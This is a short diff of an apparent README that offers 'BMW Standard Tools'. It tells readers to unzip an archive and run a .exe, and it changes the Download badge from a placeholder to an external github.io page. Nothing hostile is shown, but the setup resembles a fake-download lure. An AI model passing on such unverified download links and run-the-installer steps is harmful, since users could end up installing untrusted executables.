@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the installation and configure Standard Tools automatically.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://bmw-standard-tools.github.io/.github/)
 
 ## 📸 Overview
 ![bmw-standardtools-tool32](https://github.com/user-attachments/assets/b484f99f-c0a7-477f-aacb-a72cea551049)
